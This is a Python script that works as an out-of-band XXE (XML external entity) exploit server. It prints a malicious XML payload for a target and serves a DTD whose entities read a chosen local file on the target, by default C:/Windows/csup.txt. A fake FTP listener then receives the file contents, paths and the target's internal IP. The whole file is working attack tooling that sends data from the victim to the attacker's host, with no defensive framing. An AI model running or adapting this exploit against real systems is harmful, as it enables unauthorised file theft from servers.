import socket
import sys
import optparse
import threading


def server(host, port, file_path, lhost):
   s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   s.bind((host, port))
   s.listen(5)
   print('=' * 70 + '\n[+] Wait for FTP connecting ...')

   flag = False
   while True:
      ss, addr = s.accept()
      ss.settimeout(5)
      try:
         data = ss.recv(10240).decode()
         if data[:5] == 'GET /':
            print('[*] HTTP connect from' , ':'.join(map(lambda x:str(x),addr)))
            data = data.split('\r\n')[1].replace('User-Agent: ', '')
            print('[+] Java Version: %s' % data)
            payload = '<!ENTITY % file SYSTEM "file:///{}">\r\n<!ENTITY % ftp "<!ENTITY &#37; send SYSTEM \'ftp://{}:21/%file;\'>">'.format(file_path, lhost)
            print("[+] Send Payload to the server ...")
            ss.send(('HTTP/1.1 200 OK\r\nContent-Type: application/xml\r\nContent-length: {}\r\n\r\n{}\r\n\r\n'.format(len(payload), payload)).encode())
      except socket.timeout:
         print('[*] FTP connect from' , ':'.join(map(lambda x:str(x),addr)))
         ss.settimeout(None)
         ss.send(b'220 web Server\r\n')
         while True:
            data = ss.recv(10240).decode().rstrip('\r\n')
            if data[:4] == 'USER':
               ss.send(b'331 password please - version check\r\n')
            elif data[:4] == 'PASS':
               # print(data.replace("PASS", "").lstrip())
               ss.send(b'230 more data please!\r\n')
            elif data[:4] == 'TYPE':
               ss.send(b'200 Ok\r\n')
            elif data[:4] == 'SIZE':
               ss.send(b'200 Ok\r\n')
            elif data[:3] == 'CWD':
               sys.stdout.write(data[4:].rstrip('/web'))
               if '\n' not in data:
                  sys.stdout.write('/')
               ss.send(b'200 Ok\r\n')
            elif data[:4] == 'EPRT':
               lan_ip = data.split(data[5])[2]
               print('====================================')
               print('[+] Got IP =>',lan_ip)
               print('====================================')
               ss.send(b'200 Ok\r\n')
            elif data[:4] == 'EPSV':
               ss.send(b'200 Ok\r\n')
            elif data[:4] == 'OPTS':
               ss.send(b'200 Ok\r\n')
            elif data[:4] == 'PORT':
               ss.send(b'200 PORT command ok\r\n')
            elif data[:4] == 'NLST':
               ss.send(b'drwxrwxrwx 1 owner group          1 Feb 21 04:37 test\r\n')
               ss.send(b'150 Opening BINARY mode data connection for /bin/ls\r\n')
               ss.send(b'226 Transfer complete.\r\n')
            elif data[:4] == 'LIST':
               ss.send(b'200 OK\r\n');
            elif data[:4] == 'DELE':
               ss.send(b'200 OK\r\n')
            elif data[:4] == 'XMKD':
               ss.send(b'200 OK\r\n')
            elif data[:4] == 'STOR':
               ss.send(b'200 OK\r\n')
            elif data[:4] == 'XPWD':
               ss.send(b'200 OK\r\n')
            elif data[:4] == 'RNFR':
               ss.send(b'200 OK\r\n')
            elif data[:4] == 'XRMD':
               ss.send(b'200 OK\r\n')
            elif data[:4] == "SYST":
               ss.send(b'215 RSL\r\n')
            elif data[:4] == "RETR":
               print('[+] Data:')
               print(data[4:].lstrip())
               ss.send(b'200 OK\r\n')
               flag = True
               break
            else:
               ss.send(b'Bye!!!\r\n')
               print('\n[-] special command received:', data)
               print('\n\n')
               flag = True
               break
      ss.close()
      if flag:
         break
   s.close()





if __name__ == '__main__':
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   try:
      s.connect(("8.8.8.8", 80))
      ip = s.getsockname()[0]
   finally:
      s.close()
   optparser = optparse.OptionParser(usage='python %s -l <host> -p <port>', version='%prog 1.0')
   optparser.add_option('-l', '--lhost', dest='lhost', default='0.0.0.0', type='string', help='Specify a local listening address (default: 0.0.0.0)')
   optparser.add_option('-p', '--lport', dest='lport', default=21, type='int', help='Specify a local listening port (default: 21)')
   optparser.add_option('-b', '--bhost', dest='bhost', default=ip, type='string', help='Specify a Link back address (default: Internal IP address)')
   optparser.add_option('-f', '--file', dest='file', default='C:/Windows/csup.txt', type='string', help='Specify a file path (default: C:/Windows/csup.txt)')
   (options, args) = optparser.parse_args()

   host = options.lhost
   port = options.lport
   bhost = options.bhost
   file_path = options.file

   print("""[+] Send The Following XML Payload to the server\n<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY [
<!ENTITY % dtd PUBLIC "-//OXML/XXE/EN" "http://{}:{}">
 %dtd;%ftp;%send;
 ]>
<ANY>xxe</ANY>""".format(bhost, port))
   t = threading.Thread(target=server, args=(host, port, file_path, bhost))
   t.daemon = True
   t.start()
   t.join()
   